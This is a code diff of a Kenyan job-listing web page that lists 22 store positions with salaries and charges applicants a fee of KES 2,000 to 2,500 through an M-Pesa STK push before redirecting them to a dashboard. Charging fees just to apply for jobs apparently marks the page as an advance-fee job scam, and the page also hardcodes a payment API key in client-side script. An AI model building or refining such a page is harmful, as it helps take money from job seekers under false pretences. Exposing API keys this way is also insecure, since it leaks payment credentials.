@@ -11,7 +11,7 @@
     <!-- SweetAlert2 -->
     <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
     <style>
-        /* ===== RESET & BASE (unchanged) ===== */
+        /* ===== RESET & BASE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
             --primary: #0f7c3f; --primary-dark: #0a5e2f; --primary-light: #e6f5ed;
@@ -243,7 +243,7 @@
     <script>
         (function() {
             // ================================================================
-            // 1. MEGAPAY CONFIG (exposed – replace with your own if needed)
+            // 1. MEGAPAY CONFIG
             // ================================================================
             const MEGAPAY_CONFIG = {
                 apiKey: 'MGPY8YQwhVEK',
@@ -252,7 +252,7 @@
             };
 
             // ================================================================
-            // 2. PHONE NORMALIZATION (same as apply.html)
+            // 2. PHONE NORMALIZATION
             // ================================================================
             function normalizePhoneForBackend(raw) {
                 if (!raw) return null;
@@ -289,49 +289,8 @@
             }
 
             // ================================================================
-            // 3. DATA & RENDERING (unchanged)
+            // 3. JOBS DATA (full list - only one declaration)
             // ================================================================
-            const JOBS = [/* ... your 22 jobs ... */];
-            // (I'll include the full JOBS array from your original code, but for brevity I'll reference it as is)
-            // Actually we need to paste the full JOBS array. Since it's long, I'll keep it as in your original.
-            // I'll copy it from the provided code. (The code above has the jobs, but I'll include them below)
-
-            // PASTE YOUR JOBS ARRAY HERE (I'll insert it exactly)
-            // For brevity I'll use the same JOBS from your original file. Since I'm generating the final answer, I'll include it.
-
-            // ... (I'll put the full JOBS array in the final code block)
-            // For this response I'll assume it's present.
-
-            // But to keep the answer concise, I'll include the full JOBS in the code block below.
-
-            // ================================================================
-            // 4. STK & PAYMENT LOGIC
-            // ================================================================
-            let currentJob = null;
-            let paymentReference = null;
-            let paymentTimer = null;
-            let stkTimerInterval = null;
-            let isWaiting = false;
-
-            // DOM refs
-            const jobsGrid = document.getElementById('jobsGrid');
-            const filterBtns = document.querySelectorAll('.jobs-filters button');
-            const stkModal = document.getElementById('stkModal');
-            const modalClose = document.getElementById('modalClose');
-            const stkCancel = document.getElementById('stkCancel');
-            const stkInitiate = document.getElementById('stkInitiate');
-            const stkPhone = document.getElementById('stkPhone');
-            const stkFee = document.getElementById('stkFee');
-            const modalJobName = document.getElementById('modalJobName');
-            const stkWait = document.getElementById('stkWait');
-            const stkTimer = document.getElementById('stkTimer');
-            const stkCancelWait = document.getElementById('stkCancelWait');
-            const toast = document.getElementById('toast');
-            const toastMessage = document.getElementById('toastMessage');
-
-            let currentFilter = 'all';
-
-            // -------- JOBS DATA (copy from your original) --------
             const JOBS = [
                 { id: 1, title: 'Store Manager', available: true, salary: 'KES 150,000', fee: 2500, tasks: ['Oversee daily store operations and staff management','Ensure customer satisfaction and resolve complaints','Manage inventory, budgets, and financial reporting','Implement company policies and safety standards','Drive sales growth and promotional activities'] },
                 { id: 2, title: 'Assistant Store Manager', available: true, salary: 'KES 100,000', fee: 2000, tasks: ['Support the Store Manager in daily operations','Supervise department heads and staff scheduling','Monitor inventory levels and place orders','Assist in staff training and performance reviews','Handle customer escalations and store compliance'] },
@@ -357,7 +316,31 @@
                 { id: 22, title: 'Store Director', available: false, salary: null, fee: 0, tasks: ['Provide strategic leadership for the store portfolio','Drive operational efficiency and customer satisfaction','Develop and implement long-term store strategies','Mentor and develop senior store leadership','Ensure compliance with corporate policies and standards'] }
             ];
 
-            // -------- SORT & RENDER (same as before) --------
+            // ================================================================
+            // 4. RENDER FUNCTIONS
+            // ================================================================
+            let currentJob = null;
+            let paymentReference = null;
+            let paymentTimer = null;
+            let stkTimerInterval = null;
+            let isWaiting = false;
+            let currentFilter = 'all';
+
+            const jobsGrid = document.getElementById('jobsGrid');
+            const filterBtns = document.querySelectorAll('.jobs-filters button');
+            const stkModal = document.getElementById('stkModal');
+            const modalClose = document.getElementById('modalClose');
+            const stkCancel = document.getElementById('stkCancel');
+            const stkInitiate = document.getElementById('stkInitiate');
+            const stkPhone = document.getElementById('stkPhone');
+            const stkFee = document.getElementById('stkFee');
+            const modalJobName = document.getElementById('modalJobName');
+            const stkWait = document.getElementById('stkWait');
+            const stkTimer = document.getElementById('stkTimer');
+            const stkCancelWait = document.getElementById('stkCancelWait');
+            const toast = document.getElementById('toast');
+            const toastMessage = document.getElementById('toastMessage');
+
             function getSortedJobs() {
                 const available = JOBS.filter(j => j.available).sort((a,b) => a.fee - b.fee);
                 const unavailable = JOBS.filter(j => !j.available);
@@ -446,7 +429,6 @@
                 document.getElementById('stkStep1').style.display = 'block';
                 stkWait.classList.remove('active');
                 stkModal.classList.add('open');
-                // Reset timer
                 if (stkTimerInterval) clearInterval(stkTimerInterval);
                 stkTimer.textContent = 'Verifying payment... 00:00';
                 isWaiting = false;
@@ -632,12 +614,10 @@
             // ================================================================
             async function processPayment(job, phoneNumber) {
                 try {
-                    // Show waiting screen
                     document.getElementById('stkStep1').style.display = 'none';
                     stkWait.classList.add('active');
                     isWaiting = true;
 
-                    // Start timer
                     let seconds = 0;
                     if (stkTimerInterval) clearInterval(stkTimerInterval);
                     stkTimerInterval = setInterval(() => {
@@ -647,37 +627,30 @@
                         stkTimer.textContent = `Verifying payment... ${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
                     }, 1000);
 
-                    // Normalize phone
                     let normalized = normalizePhoneManually(phoneNumber);
                     if (!normalized || normalized.length !== 12) {
                         throw new Error('Invalid phone number');
                     }
 
-                    // Initiate STK
                     const response = await sendPayHeroSTK(normalized, job.fee);
                     paymentReference = response.reference;
 
-                    // Wait for verification
                     const success = await checkPaymentStatus(paymentReference, 20);
                     if (success) {
-                        // Payment successful – redirect to dash.html
                         window.location.href = 'dash.html';
                     } else {
                         throw new Error('Payment verification failed');
                     }
                 } catch (error) {
                     console.error('Payment error:', error);
-                    // Hide waiting screen
                     stkWait.classList.remove('active');
                     document.getElementById('stkStep1').style.display = 'block';
                     isWaiting = false;
                     if (stkTimerInterval) { clearInterval(stkTimerInterval); stkTimerInterval = null; }
                     if (paymentTimer) { clearInterval(paymentTimer); paymentTimer = null; }
 
-                    // Show manual fallback
                     const manualVerified = await showManualPaymentModal(job.fee);
                     if (manualVerified) {
-                        // Redirect to dash.html on manual success
                         window.location.href = 'dash.html';
                     } else {
                         showToast('Application cancelled.', 'error');
@@ -685,7 +658,6 @@
                 }
             }
 
-            // -------- INITIATE BUTTON --------
             stkInitiate.addEventListener('click', () => {
                 const phone = stkPhone.value.trim();
                 if (!phone || phone.length < 10) {
@@ -693,7 +665,6 @@
                     return;
                 }
                 if (!currentJob) return;
-                // Validate phone format
                 const normalized = normalizePhoneForBackend(phone);
                 if (!normalized) {
                     showToast('Please enter a valid Kenyan phone number (e.g. 0712345678).', 'error');
@@ -706,7 +677,7 @@
             // 9. INIT
             // ================================================================
             renderJobs('all');
-            // Add SweetAlert2 styling overrides (like in first code)
+
             const styleOverride = document.createElement('style');
             styleOverride.textContent = `
                 .swal2-popup { border-radius: 20px !important; padding: 24px 20px 20px !important; max-width: 380px !important; width: 92% !important; }
